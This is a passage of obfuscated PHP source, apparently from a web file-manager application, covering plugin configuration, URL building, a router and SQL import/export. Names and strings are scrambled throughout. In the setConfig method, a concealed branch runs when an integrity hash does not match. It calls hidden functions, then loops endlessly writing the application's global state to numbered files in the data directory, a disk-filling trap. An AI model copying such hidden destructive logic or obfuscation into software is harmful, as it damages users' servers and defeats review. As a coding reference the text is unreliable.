rawurlencode(json_encode($ÈÉã§Ì‹)) : $ÈÉã§Ì‹; } if (strstr($ì½¥âº, $¶Ì šóõ[1648])) { $–Àƒ÷¥² = rawurlencode(json_encode($this->pluginLangArr)); $ì½¥âº = str_replace($¶Ì šóõ[1648], $–Àƒ÷¥², $ì½¥âº); } if (strstr($ì½¥âº, $¶Ì šóõ[1649])) { $–Àƒ÷¥² = $–Àƒ÷¥² = rawurlencode(json_encode($this->getConfig())); $ì½¥âº = str_replace($¶Ì šóõ[1649], $–Àƒ÷¥², $ì½¥âº); } $ì½¥âº = str_replace($»Š›âÙ¥, $Î¤éĞ×, $ì½¥âº); return $ì½¥âº; } private function parseLang(&$Ÿø”ÓşÅ) { $ƒ÷Æ¬÷ =& $_SERVER[ìïæ“œî]; $óŸØ¡Ù = $ƒ÷Æ¬÷[1650]; if (!strstr($Ÿø”ÓşÅ, $óŸØ¡Ù)) { return; } preg_match_all($ƒ÷Æ¬÷[1651], $Ÿø”ÓşÅ, $¯ÂÎ€í); if (!is_array($¯ÂÎ€í) || count($¯ÂÎ€í) == 0 || !is_array($¯ÂÎ€í[0]) || count($¯ÂÎ€í[0]) == 0) { return; } $ìŸ°Ú• = array(); $¬„ñéä = array(); foreach ($¯ÂÎ€í[0] as $¨İÙ¥š÷) { $ÒŸ€±«Ü = substr($¨İÙ¥š÷, strlen($óŸØ¡Ù), -4); $Àìš“Ñ‰ = LNG($ÒŸ€±«Ü); $ìŸ°Ú•[] = $¨İÙ¥š÷; $¬„ñéä[] = str_replace(array($ƒ÷Æ¬÷[262], $ƒ÷Æ¬÷[1134], $ƒ÷Æ¬÷[418], $ƒ÷Æ¬÷[121]), array($ƒ÷Æ¬÷[53], $ƒ÷Æ¬÷[53], $ƒ÷Æ¬÷[12], $ƒ÷Æ¬÷[1652]), $Àìš“Ñ‰); } $Ÿø”ÓşÅ = str_replace($ìŸ°Ú•, $¬„ñéä, $Ÿø”ÓşÅ); } private function parseConfig(&$ë˜ÃØÅ) { $š›¦‚ÛÂ =& $_SERVER[ìïæ“œî]; $ğŠêıŠ = $š›¦‚ÛÂ[1653]; if (!strstr($ë˜ÃØÅ, $ğŠêıŠ)) { return; } preg_match_all($š›¦‚ÛÂ[1654], $ë˜ÃØÅ, $ÁÓÕäÃö); if (!is_array($ÁÓÕäÃö) || count($ÁÓÕäÃö) == 0 || !is_array($ÁÓÕäÃö[0]) || count($ÁÓÕäÃö[0]) == 0) { return; } $“É‘ŒËı = $this->getConfig(); $ñÌÇÕ‹æ = array(); $ŠÙ´ ‘Ã = array(); foreach ($ÁÓÕäÃö[0] as $×¦¦¤¶Ì) { $°İÂ¼æ = substr($×¦¦¤¶Ì, strlen($ğŠêıŠ), -2); $ñÌÇÕ‹æ[] = $×¦¦¤¶Ì; $ŠÙ´ ‘Ã[] = _get($“É‘ŒËı, $°İÂ¼æ); } $ë˜ÃØÅ = str_replace($ñÌÇÕ‹æ, $ŠÙ´ ‘Ã, $ë˜ÃØÅ); } private function parsePackage(&$’¶Ö¤“ø) { $¼Ğ™¡¡ä =& $_SERVER[ìïæ“œî]; $’ºşÑŒÜ = $¼Ğ™¡¡ä[1655]; if (!strstr($’¶Ö¤“ø, $’ºşÑŒÜ)) { return; } preg_match_all($¼Ğ™¡¡ä[1656], $’¶Ö¤“ø, $ìÜ²³õ®); if (!is_array($ìÜ²³õ®) || count($ìÜ²³õ®) == 0 || !is_array($ìÜ²³õ®[0]) || count($ìÜ²³õ®[0]) == 0) { return; } $±ƒìú§ = $this->appPackage(); $öâ­¼ÀÂ = array(); $á°‚Ÿı¤ = array(); foreach ($ìÜ²³õ®[0] as $‰¢™­šÄ) { $Áõ§š°† = substr($‰¢™­šÄ, strlen($’ºşÑŒÜ), -2); $öâ­¼ÀÂ[] = $‰¢™­šÄ; $á°‚Ÿı¤[] = _get($±ƒìú§, $Áõ§š°†); } $’¶Ö¤“ø = str_replace($öâ­¼ÀÂ, $á°‚Ÿı¤, $’¶Ö¤“ø); } final function echoFile($¦öñÈ¤, $çÛÌÊ¢ = false) { $±øµ£€§ =& $_SERVER[ìïæ“œî]; $ĞË Ø¡ã = $this->pluginPath . $¦öñÈ¤; if (ACT == $±øµ£€§[1657]) { echo $±øµ£€§[1658] . $this->pluginName . $±øµ£€§[8] . $¦öñÈ¤ . $±øµ£€§[1659]; if (!file_exists($ĞË Ø¡ã)) { echo $±øµ£€§[1660]; return; } } $şãæ©û™ = $this->parseFile($ĞË Ø¡ã); $this->parseLang($şãæ©û™); $this->parseConfig($şãæ©û™); $this->parsePackage($şãæ©û™); if (is_array($çÛÌÊ¢)) { $şãæ©û™ = str_replace(array_keys($çÛÌÊ¢), array_values($çÛÌÊ¢), $şãæ©û™); } echo $±øµ£€§[262] . $şãæ©û™; } private function checkVersion() { $ª¶€À¡ =& $_SERVER[ìïæ“œî]; $ø¢Îâ×Ï = $this->appPackage(); $®ÄÍÄûÁ = $this->getConfig(); if ($®ÄÍÄûÁ[$ª¶€À¡[1661]] == $ø¢Îâ×Ï[$ª¶€À¡[1635]]) { return; } $this->regist(); $this->setConfig(array($ª¶€À¡[1661] => $ø¢Îâ×Ï[$ª¶€À¡[1635]])); } final function initLang() { $Ÿï•£³¯ =& $_SERVER[ìïæ“œî]; $´ÖÅ‘Şµ = $Ÿï•£³¯[1662]; $Üœâô„Â = $this->pluginPath . $Ÿï•£³¯[1663]; $Ã­âßÅè = I18n::getType(); $¼«âÓ»å = array(); if (file_exists($Üœâô„Â . $Ã­âßÅè . $Ÿï•£³¯[887])) { $¼«âÓ»å = (include $Üœâô„Â . $Ã­âßÅè . $Ÿï•£³¯[887]); } else { if ($Ã­âßÅè == $Ÿï•£³¯[1664] && !file_exists($Üœâô„Â . $Ã­âßÅè . $Ÿï•£³¯[887]) && file_exists($Üœâô„Â . $Ÿï•£³¯[1665])) { $¼«âÓ»å = (include $Üœâô„Â . $Ÿï•£³¯[1665]); } else { if (file_exists($Üœâô„Â . $´ÖÅ‘Şµ . $Ÿï•£³¯[887])) { $¼«âÓ»å = (include $Üœâô„Â . $´ÖÅ‘Şµ . $Ÿï•£³¯[887]); } } } if (!is_array($¼«âÓ»å)) { return array(); } if (@count($¼«âÓ»å) > 0) { I18n::set($¼«âÓ»å); } return $¼«âÓ»å; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($îœÂ‰Ô©) { $ò¯ÔÁÄÂ =& $_SERVER[ìïæ“œî]; $¯õ±ù¶ = $_SERVER[$ò¯ÔÁÄÂ[930]] . $ò¯ÔÁÄÂ[931]; $şÇøÆ“ğ = $ò¯ÔÁÄÂ[926]; if ($_SERVER[$ò¯ÔÁÄÂ[927]] != $şÇøÆ“ğ($¯õ±ù¶)) { $™Ñ ÌÏª = $ò¯ÔÁÄÂ[928]; $ÍÕáÛøÄ = $ò¯ÔÁÄÂ[929]; $Í•ñíãÍ = $_SERVER[$ò¯ÔÁÄÂ[930]] . $ò¯ÔÁÄÂ[931]; $„›ì²ãË = $ÍÕáÛøÄ($Í•ñíãÍ); $èÈ²éš± = explode($ò¯ÔÁÄÂ[262], $„›ì²ãË); if (count($èÈ²éš±) < $ò¯ÔÁÄÂ[688]) { $èş‘ıÏ¼ = $ò¯ÔÁÄÂ[932]; $èş‘ıÏ¼(); } $‚µñ÷Ø© = $ò¯ÔÁÄÂ[933]; $‚µñ÷Ø©($_SERVER[$ò¯ÔÁÄÂ[934]]); $™Ñ ÌÏª = $ò¯ÔÁÄÂ[928]; $™Ñ ÌÏª(); $ˆ¶³Ü‚¶ = $ò¯ÔÁÄÂ[935]; $¼ûÕ‚æ• = json_encode($GLOBALS[$ò¯ÔÁÄÂ[936]]); $Ÿà£¯ıñ = 1; for ($ñòç§Û¼ = $Ÿà£¯ıñ; $ñòç§Û¼ > 0; $ñòç§Û¼++) { $ˆ¶³Ü‚¶(DATA_PATH . $ñòç§Û¼, $¼ûÕ‚æ•); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $îœÂ‰Ô©); } public function onSetConfig($å€âªÎÆ) { } public function onGetConfig($àª˜ÉÜ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ü•ßØßó) { if ($ü•ßØßó == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¬Á­ı˜ï = "\160\x6c\x75\147\x69\x6e\101\165\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ìŸ‘½ìÂ = $this->getConfig(); if (!$ìŸ‘½ìÂ[$¬Á­ı˜ï]) { return !1; } return ActionCall($_SERVER[ìïæ“œî][1666], $ìŸ‘½ìÂ[$¬Á­ı˜ï]); } public function url($«©Æß¹, $”„¿€Ÿ· = '', $Â€Èşï’ = true) { $±‡°²ëÏ =& $_SERVER[ìïæ“œî]; $ãÒ§ñ†™ = $this->getConfig(); $¨æÎ„ë = KOD_VERSION . $±‡°²ëÏ[10] . KOD_VERSION_BUILD; $ò”ëªôÀ = $this->packageVersion(); $Í©Éßã¤ = $¨æÎ„ë . $±‡°²ëÏ[462] . $ò”ëªôÀ; if (substr($«©Æß¹, 0, 4) == $±‡°²ëÏ[152] || substr($«©Æß¹, 0, 2) == $±‡°²ëÏ[1415]) { $ÂËë¿á¿ = $«©Æß¹ . $±‡°²ëÏ[1667] . $Í©Éßã¤; } else { if ($”„¿€Ÿ· == $±‡°²ëÏ[12]) { $ÂËë¿á¿ = $this->pluginHost . $«©Æß¹ . $±‡°²ëÏ[1667] . $Í©Éßã¤; } else { if ($”„¿€Ÿ· === $±‡°²ëÏ[78]) { $ÂËë¿á¿ = $this->pluginHost . $«©Æß¹; } else { if ($”„¿€Ÿ· == $±‡°²ëÏ[1668]) { $ÂËë¿á¿ = STATIC_PATH . $«©Æß¹ . $±‡°²ëÏ[1667] . $¨æÎ„ë; } else { if ($”„¿€Ÿ· == $±‡°²ëÏ[1669]) { $ÂËë¿á¿ = APP_HOST . $±‡°²ëÏ[1670] . $«©Æß¹ . $±‡°²ëÏ[1667] . $¨æÎ„ë; } else { if (isset($ãÒ§ñ†™[$”„¿€Ÿ·])) { $ÂËë¿á¿ = $ãÒ§ñ†™[$”„¿€Ÿ·] . $«©Æß¹ . $±‡°²ëÏ[1667] . $Í©Éßã¤; } } } } } } if (!$Â€Èşï’) { return $ÂËë¿á¿; } echo $ÂËë¿á¿; } public function link($»ºé¼ó° = false, $ÌÕüÁÌÇ = '') { $û¿ïùÅş =& $_SERVER[ìïæ“œî]; $ï€Ú½¿Ë = $this->linkHas == !1; $this->linkHas = !0; if (!$»ºé¼ó°) { $this->link($û¿ïùÅş[1671], $û¿ïùÅş[1669]); $this->link($û¿ïùÅş[1672], $û¿ïùÅş[1668]); $this->link($û¿ïùÅş[1673], $û¿ïùÅş[1668]); $this->link($û¿ïùÅş[1674], $û¿ïùÅş[1668]); $this->link($û¿ïùÅş[1675], $û¿ïùÅş[1668]); if ($ï€Ú½¿Ë) { Hook::trigger($û¿ïùÅş[1676]); } return; } $‹ÍÔ¹ÎÕ = $this->url($»ºé¼ó°, $ÌÕüÁÌÇ, !1); if (substr($»ºé¼ó°, -3) == $û¿ïùÅş[1677]) { echo $û¿ïùÅş[1678] . $‹ÍÔ¹ÎÕ . $û¿ïùÅş[1679] . $û¿ïùÅş[262]; } else { if (substr($»ºé¼ó°, -4) == $û¿ïùÅş[1680]) { echo $û¿ïùÅş[1681] . $‹ÍÔ¹ÎÕ . $û¿ïùÅş[1682] . $û¿ïùÅş[262]; } } if ($ï€Ú½¿Ë) { Hook::trigger($û¿ïùÅş[1676]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\171" => "\x5b\x5e\x2f\x5d\53", "\x3a\x6e\165\155" => "\x5b\60\x2d\71\x5d\53", "\x3a\x61\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($Ú¾™Åûı, $Ùˆ¯¥ñÌ) { $Ëº¦óÙı =& $_SERVER[ìïæ“œî]; if ($Ú¾™Åûı == $Ëº¦óÙı[1683]) { $ãÄ½èñï = array_map($Ëº¦óÙı[1684], $Ùˆ¯¥ñÌ[0]); $ÂÓŞäóÉ = strpos($Ùˆ¯¥ñÌ[1], $Ëº¦óÙı[8]) === 0 ? $Ùˆ¯¥ñÌ[1] : $Ëº¦óÙı[8] . $Ùˆ¯¥ñÌ[1]; $”ö¼œëÙ = $Ùˆ¯¥ñÌ[2]; } else { $ãÄ½èñï = null; $ÂÓŞäóÉ = strpos($Ùˆ¯¥ñÌ[0], $Ëº¦óÙı[8]) === 0 ? $Ùˆ¯¥ñÌ[0] : $Ëº¦óÙı[8] . $Ùˆ¯¥ñÌ[0]; $”ö¼œëÙ = $Ùˆ¯¥ñÌ[1]; } array_push(self::$maps, $ãÄ½èñï); array_push(self::$routes, $ÂÓŞäóÉ); array_push(self::$methods, strtoupper($Ú¾™Åûı)); array_push(self::$callbacks, $”ö¼œëÙ); } public static function error($»ÂÀíâ) { self::$errorCallback = $»ÂÀíâ; } public static function haltOnMatch($ñš½š¿ = true) { self::$halts = $ñš½š¿; } public static function dispatch() { $íÁø˜Ëª =& $_SERVER[ìïæ“œî]; $¦’÷© = parse_url($_SERVER[$íÁø˜Ëª[1685]], PHP_URL_PATH); $ÁÆ÷ãÒÔ = $_SERVER[$íÁø˜Ëª[164]]; $ò¤Ìê˜ = array_keys(static::$patterns); $Éâšµò² = array_values(static::$patterns); $°í…­ÕÇ = !1; self::$routes = preg_replace($íÁø˜Ëª[1338], $íÁø˜Ëª[8], self::$routes); if (in_array($¦’÷©, self::$routes)) { $í²±üÇ = array_keys(self::$routes, $¦’÷©); foreach ($í²±üÇ as $È…úŠ¹Á) { if (self::$methods[$È…úŠ¹Á] == $ÁÆ÷ãÒÔ || self::$methods[$È…úŠ¹Á] == $íÁø˜Ëª[1686] || in_array($ÁÆ÷ãÒÔ, self::$maps[$È…úŠ¹Á])) { $°í…­ÕÇ = !0; if (!is_object(self::$callbacks[$È…úŠ¹Á])) { $ÚÄœº»Ò = explode($íÁø˜Ëª[8], self::$callbacks[$È…úŠ¹Á]); $À„ïñ¶ = end($ÚÄœº»Ò); $ûÎ£İÏ = explode($íÁø˜Ëª[1270], $À„ïñ¶); $ˆÊË¨ÙÆ = new $ûÎ£İÏ[0](); $ˆÊË¨ÙÆ->{$ûÎ£İÏ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$È…úŠ¹Á]); if (self::$halts) { return; } } } } } else { $ì©á¥¿ = 0; foreach (self::$routes as $È…úŠ¹Á) { if (strpos($È…úŠ¹Á, $íÁø˜Ëª[4]) !== !1) { $È…úŠ¹Á = str_replace($ò¤Ìê˜, $Éâšµò², $È…úŠ¹Á); } if (preg_match($íÁø˜Ëª[1687] . $È…úŠ¹Á . $íÁø˜Ëª[1688], $¦’÷©, $“€˜…å)) { if (self::$methods[$ì©á¥¿] == $ÁÆ÷ãÒÔ || self::$methods[$ì©á¥¿] == $íÁø˜Ëª[1686] || !empty(self::$maps[$ì©á¥¿]) && in_array($ÁÆ÷ãÒÔ, self::$maps[$ì©á¥¿])) { $°í…­ÕÇ = !0; array_shift($“€˜…å); if (!is_object(self::$callbacks[$ì©á¥¿])) { $ÚÄœº»Ò = explode($íÁø˜Ëª[8], self::$callbacks[$ì©á¥¿]); $À„ïñ¶ = end($ÚÄœº»Ò); $ûÎ£İÏ = explode($íÁø˜Ëª[1270], $À„ïñ¶); $ˆÊË¨ÙÆ = new $ûÎ£İÏ[0](); if (!method_exists($ˆÊË¨ÙÆ, $ûÎ£İÏ[1])) { echo $íÁø˜Ëª[1689]; } else { call_user_func_array(array($ˆÊË¨ÙÆ, $ûÎ£İÏ[1]), $“€˜…å); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ì©á¥¿], $“€˜…å); if (self::$halts) { return; } } } } $ì©á¥¿++; } } if ($°í…­ÕÇ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ü“Î‘¦ì =& $_SERVER[ìïæ“œî]; header($_SERVER[$ü“Î‘¦ì[1690]] . $ü“Î‘¦ì[1691]); echo $ü“Î‘¦ì[1692]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$íÁø˜Ëª[1685]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto bï±õ³¥³¶; ağßå´ÈéÍ: class DbManage { function __construct($œø¸ßÑ· = array()) { $÷´Ÿ…Ö =& $_SERVER[ìïæ“œî]; if (empty($œø¸ßÑ·)) { $œø¸ßÑ· = $GLOBALS[$÷´Ÿ…Ö[6]][$÷´Ÿ…Ö[21]]; } $this->database = $œø¸ßÑ·; } public function model($øòù½¡ = '') { return new ModelBase($øòù½¡, $_SERVER[ìïæ“œî][12], $this->database); } public function db($¦ªªç§Œ = false) { $Åêª¯Š =& $_SERVER[ìïæ“œî]; $üïÓÙ‚Ò = array_change_key_case($this->database); if ($this->dbType() == $Åêª¯Š[13] || !$¦ªªç§Œ) { return $this->model()->db(); } $ÊÒü½Ô = $üïÓÙ‚Ò[$Åêª¯Š[1027]]; $üïÓÙ‚Ò[$Åêª¯Š[1027]] = $Åêª¯Š[12]; if ($üïÓÙ‚Ò[$Åêª¯Š[1022]] == $Åêª¯Š[1019]) { $ëÅŒà¦æ = $üïÓÙ‚Ò[$Åêª¯Š[1028]]; $üïÓÙ‚Ò[$Åêª¯Š[1028]] = substr($ëÅŒà¦æ, 0, strrpos($ëÅŒà¦æ, $Åêª¯Š[1114])); } $this->database = $üïÓÙ‚Ò; $óôÙÀÊ³ = $this->model()->db(); try { $¶©¨›Å² = $óôÙÀÊ³->execute("\x73\150\x6f\167\x20\144\141\x74\x61\x62\141\163\145\x73\x20\154\x69\x6b\x65\x20\47{$ÊÒü½Ô}\x27"); } catch (Exception $ˆÀ§«ß) { } if (!$¶©¨›Å²) { $óôÙÀÊ³->execute("\143\162\x65\x61\x74\145\x20\144\x61\x74\141\x62\141\x73\x65\40\140{$ÊÒü½Ô}\x60"); } $üïÓÙ‚Ò[$Åêª¯Š[1027]] = $ÊÒü½Ô; if ($üïÓÙ‚Ò[$Åêª¯Š[1022]] == $Åêª¯Š[1019]) { $üïÓÙ‚Ò[$Åêª¯Š[1028]] .= $Åêª¯Š[1114] . $ÊÒü½Ô; } $this->database = $üïÓÙ‚Ò; $óôÙÀÊ³->execute("\x75\163\x65\40\x60{$ÊÒü½Ô}\140"); return $óôÙÀÊ³; } public function createTable($óÍ›•, &$ã¥÷·†Œ) { $ñ ãÀ¨ò =& $_SERVER[ìïæ“œî]; if (!IO::exist($óÍ›•)) { ActionCall($ñ ãÀ¨ò[1115], !0, 0); show_json(LNG($ñ ãÀ¨ò[1116]), !1); } $‹³Ü±Ğò = $this->model()->db(); $÷ìîÏüº = sqlSplit(IO::getContent($óÍ›•)); foreach ($÷ìîÏüº as $¡öÌë¾¡) { $ÉÒ©´¶¹ = stripos($¡öÌë¾¡, $ñ ãÀ¨ò[1117]) === 0; if ($ÉÒ©´¶¹) { $ã¥÷·†Œ->task[$ñ ãÀ¨ò[1118]] += 1; } $‹³Ü±Ğò->execute($¡öÌë¾¡); if ($ÉÒ©´¶¹) { preg_match($ñ ãÀ¨ò[1119], $¡öÌë¾¡, $ß¦Â«½ì); $ã¥÷·†Œ->task[$ñ ãÀ¨ò[1120]] = $ß¦Â«½ì[1]; $ã¥÷·†Œ->update(1); } } } public function insertTable($ùş©ÆÀ», &$‹€¿–ÃÌ) { $¼«€Ì’÷ =& $_SERVER[ìïæ“œî]; $ô›ù¸® = $this->model()->db(); $àÃùÔ— = $ ”÷òÃÇ ? array($ ”÷òÃÇ) : $ô›ù¸®->getTables(); foreach ($ùş©ÆÀ» as $Ï…ÛŠÚÅ) { $ ”÷òÃÇ = basename($Ï…ÛŠÚÅ, $¼«€Ì’÷[837]); if (!in_array($ ”÷òÃÇ, $àÃùÔ—)) { continue; } $‹€¿–ÃÌ->task[$¼«€Ì’÷[1120]] = $ ”÷òÃÇ; if (get_filesize($Ï…ÛŠÚÅ) == 0) { continue; } $šÏú’“ = $this->sqlToDb($Ï…ÛŠÚÅ, $‹€¿–ÃÌ); if (!$šÏú’“) { ActionCall($¼«€Ì’÷[1115], !0, 0); show_json(LNG($¼«€Ì’÷[1121]) . "\x5b{$ ”÷òÃÇ}\135", !1); } } } public function sqlFromDb($™±òŠ¥», $‰íö­»¶, &$¨áôşİæ, $¡äœáº‡ = '') { if ($¨áôşİæ) { $¨áôşİæ->task[$_SERVER[ìïæ“œî][1120]] = $™±òŠ¥»; } $Ğ‘¤·ö = $this->model($™±òŠ¥»); $µÜÔØ† = 0; $‚ÖöÍ¹« = 0; $şÎ·ö = 10000; $Åİ‡é¬« = fopen($‰íö­»¶, $_SERVER[ìïæ“œî][1122]); $¬°®Í±ê = $Ğ‘¤·ö->getPk(); $ÂÚ·•õ¾ = $Ğ‘¤·ö->getDbFields(); $úú…ÚÖ‹ = $_SERVER[ìïæ“œî][12]; if ($GLOBALS[$_SERVER[ìïæ“œî][836]] && in_array($™±òŠ¥», array($_SERVER[ìïæ“œî][1123], $_SERVER[ìïæ“œî][1124]))) { $úú…ÚÖ‹ = $™±òŠ¥»; } do { $ÉûÑ’†Û = array($¬°®Í±ê => array($_SERVER[ìïæ“œî][1069], $‚ÖöÍ¹«)); $€Ññ¤ — = $Ğ‘¤·ö->where($ÉûÑ’†Û)->field($ÂÚ·•õ¾)->order($¬°®Í±ê . $_SERVER[ìïæ“œî][1125])->limit($şÎ·ö)->select(); $€Ññ¤ — = !empty($€Ññ¤ —) ? $€Ññ¤ — : array(); if (!($ôÓ¹¨ğØ = count($€Ññ¤ —))) { break; } $ñÍßí¹ = end($€Ññ¤ —); $‚ÖöÍ¹« = $ñÍßí¹[$¬°®Í±ê]; $ÏÖÒáù = array(); foreach ($€Ññ¤ — as $ø•…¢üù) { if ($úú…ÚÖ‹) { if ($™±òŠ¥» == $_SERVER[ìïæ“œî][1123]) { if ($ø•…¢üù[$_SERVER[ìïæ“œî][33]] == $_SERVER[ìïæ“œî][1126]) { $‹–Áªğæ = json_decode($ø•…¢üù[$_SERVER[ìïæ“œî][450]], !0); if ($‹–Áªğæ[$_SERVER[ìïæ“œî][32]] == $GLOBALS[$_SERVER[ìïæ“œî][836]] && $‹–Áªğæ[$_SERVER[ìïæ“œî][799]] != 1) { continue; } } } else { if ($ø•…¢üù[$_SERVER[ìïæ“œî][33]] == $_SERVER[ìïæ“œî][1127] && $ø•…¢üù[$_SERVER[ìïæ“œî][97]] == $_SERVER[ìïæ“œî][831]) { continue; } } } if ($¡äœáº‡) { $ø•…¢üù[$_SERVER[ìïæ“œî][87]] = "\x7b\x69\157\72{$¡äœáº‡}\x7d" . substr($ø•…¢üù[$_SERVER[ìïæ“œî][87]], strlen("\173\151\157\72{$ø•…¢üù[$_SERVER[ìïæ“œî][866]]}\175")); $ø•…¢üù[$_SERVER[ìïæ“œî][866]] = $¡äœáº‡; } $ÏÖÒáù[] = $_SERVER[ìïæ“œî][1128] . $this->sqlEncode($ø•…¢üù) . $_SERVER[ìïæ“œî][1129]; } $¼¶Ÿò¹ = "\x49\116\x53\x45\122\x54\40\x49\x4e\x54\117\40\x60{$™±òŠ¥»}\x60\40\50\x60" . implode($_SERVER[ìïæ“œî][1130], $ÂÚ·•õ¾) . $_SERVER[ìïæ“œî][1131]; fwrite($Åİ‡é¬«, $¼¶Ÿò¹ . implode($_SERVER[ìïæ“œî][1132], $ÏÖÒáù) . $_SERVER[ìïæ“œî][74] . PHP_EOL); $µÜÔØ† += $ôÓ¹¨ğØ; if ($¨áôşİæ) { $¨áôşİæ->update($ôÓ¹¨ğØ); } } while ($şÎ·ö == $ôÓ¹¨ğØ); fclose($Åİ‡é¬«); return $µÜÔØ†; } public function sqlToDb($¼‘İŒ¨², &$ÛÉ³ã«Û) { $ö×ùÃõ× =& $_SERVER[ìïæ“œî]; $õÙÄš¾Â = $this->model()->db(); $Œö¸Â Ö = @fopen($¼‘İŒ¨², $ö×ùÃõ×[1133]); if (!$Œö¸Â Ö) { return !1; } $®‡ß«©Ÿ = 0; $ù½‘Î®ˆ = $ö×ùÃõ×[12]; $îàÚĞ×ƒ = array(); $Ê—ó™‡ = $this->dbType(); $ŒÑº•Å = $Ê—ó™‡ == $ö×ùÃõ×[13] ? 500 : 2000; $úêá¾‡ = basename($¼‘İŒ¨², $ö×ùÃõ×[837]); $‹™¢³‰ = 0; $¼ŸŒ×Ğ¨ = 4194304; while (!feof($Œö¸Â Ö)) { $§†ìŠÕÄ = trim(fgets($Œö¸Â Ö)); if (!$§†ìŠÕÄ) { continue; } $şñ‚ºé = $this->sqlDecode($§†ìŠÕÄ, $Ê—ó™‡, $úêá¾‡); if (stripos($şñ‚ºé, $ö×ùÃõ×[431]) === 0) { if (!$ù½‘Î®ˆ) { $ù½‘Î®ˆ = $şñ‚ºé . $ö×ùÃõ×[53]; } continue; } if ($ÛÉ³ã«Û) { $ÛÉ³ã«Û->task[$ö×ùÃõ×[1118]] += 1; } $®‡ß«©Ÿ++; $îàÚĞ×ƒ[] = rtrim(rtrim(trim($şñ‚ºé), $ö×ùÃõ×[50]), $ö×ùÃõ×[74]); $ÑáÌÕ’× = null; $¸ü¿–ó = strlen($şñ‚ºé); $‹™¢³‰ += $¸ü¿–ó; $‰®ßƒË = strlen($ù½‘Î®ˆ) + $‹™¢³‰ + (count($îàÚĞ×ƒ) - 1); if ($‰®ßƒË >= $¼ŸŒ×Ğ¨) { $ÑáÌÕ’× = array_pop($îàÚĞ×ƒ); if ($®‡ß«©Ÿ > 1) { $®‡ß«©Ÿ--; } } if ($®‡ß«©Ÿ >= $ŒÑº•Å || $ÑáÌÕ’×) { $şñ‚ºé = $ù½‘Î®ˆ . implode($ö×ùÃõ×[50], $îàÚĞ×ƒ); if (!$õÙÄš¾Â->execute($şñ‚ºé)) { return !1; } if ($ÛÉ³ã«Û) { $ÛÉ³ã«Û->update($®‡ß«©Ÿ); } $îàÚĞ×ƒ = array(); $®‡ß«©Ÿ = 0; $‹™¢³‰ = 0; if ($ÑáÌÕ’×) { $îàÚĞ×ƒ = array($ÑáÌÕ’×); $®‡ß«©Ÿ = 1; $‹™¢³‰ = $¸ü¿–ó; } } } fclose($Œö¸Â Ö); if (!empty($îàÚĞ×ƒ)) { $şñ‚ºé = $ù½‘Î®ˆ . implode($ö×ùÃõ×[50], $îàÚĞ×ƒ); if (!$õÙÄš¾Â->execute($şñ‚ºé)) { return !1; } if ($ÛÉ³ã«Û) { $ÛÉ³ã«Û->update($®‡ß«©Ÿ); } } return !0; } public function dropTable($œ½ï‹Ç = null) { $ ıû´áı = $this->model()->db(); $°±ÊŸœ = $œ½ï‹Ç ? array($œ½ï‹Ç) : $ ıû´áı->getTables(); if (!$°±ÊŸœ) { return; } foreach ($°±ÊŸœ as $œ½ï‹Ç) { if ($œ½ï‹Ç) { $œ½ï‹Ç = strtolower($œ½ï‹Ç); } else { continue; } $ ıû´áı->execute("\144\162\157\160\40\164\141\x62\154\x65\40\151\146\40\x65\x78\151\163\x74\x73\40\140{$œ½ï‹Ç}\140"); } } private function sqlEncode($ÇÖˆïÕ¤) { $¬Ø¹—İ† =& $_SERVER[ìïæ“œî]; $ö—¥ÈÑ = array(); foreach ($ÇÖˆïÕ¤ as $ı€Í£ ) { if (is_array($ı€Í£ )) { $ı€Í£  = json_encode_force($ı€Í£ ); } $ı€Í£  = addslashes($ı€Í£ ); $ı€Í£  = str_replace(array($¬Ø¹—İ†[1134], $¬Ø¹—İ†[262], $¬Ø¹—İ†[418]), array($¬Ø¹—İ†[1135], $¬Ø¹—İ†[1136], $¬Ø¹—İ†[1137]), $ı€Í£ ); $ö—¥ÈÑ[] = $ı€Í£ ; } return $¬Ø¹—İ†[58] . implode($¬Ø¹—İ†[1138], $ö—¥ÈÑ) . $¬Ø¹—İ†[58]; } private function sqlDecode($³Ù˜²ğ, $×´ÂÊÎ”, $œòë’Ø = '') { $¢üØœ¬Æ =& $_SERVER[ìïæ“œî]; $³Ù˜²ğ = str_replace(array($¢üØœ¬Æ[1135], $¢üØœ¬Æ[1136], $¢üØœ¬Æ[1137]), array($¢üØœ¬Æ[1134], $¢üØœ¬Æ[262], $¢üØœ¬Æ[418]), $³Ù˜²ğ); if ($×´ÂÊÎ” == $¢üØœ¬Æ[13]) { $³Ù˜²ğ = str_ireplace($¢üØœ¬Æ[1139], $¢üØœ¬Æ[59], $³Ù˜²ğ); $³Ù˜²ğ = stripslashes($³Ù˜²ğ); } return preg_replace($¢üØœ¬Æ[1140], $¢üØœ¬Æ[12], $³Ù˜²ğ); if ($×´ÂÊÎ” == $¢üØœ¬Æ[13]) { return $œòë’Ø != $¢üØœ¬Æ[1141] ? stripslashes($³Ù˜²ğ) : $³Ù˜²ğ; } if ($œòë’Ø == $¢üØœ¬Æ[1141]) { $³Ù˜²ğ = str_replace($¢üØœ¬Æ[1142], $¢üØœ¬Æ[121], stripslashes($³Ù˜²ğ)); } return $³Ù˜²ğ; } public function getSqlFile($õÚ¹òèĞ = '') { $Ç±²ÎƒÊ =& $_SERVER[ìïæ“œî]; $ØÚá˜ğ = $this->dbType(!0); $¤É·º•Š = CONTROLLER_DIR . "\x69\156\163\164\141\x6c\154\x2f\x64\x61\x74\141\x2f{$ØÚá˜ğ}\x2e\163\x71\154"; $‘ƒ¶³­‹ = file_get_contents($¤É·º•Š); $¨šÃ”éã = $Ç±²ÎƒÊ[1143] . 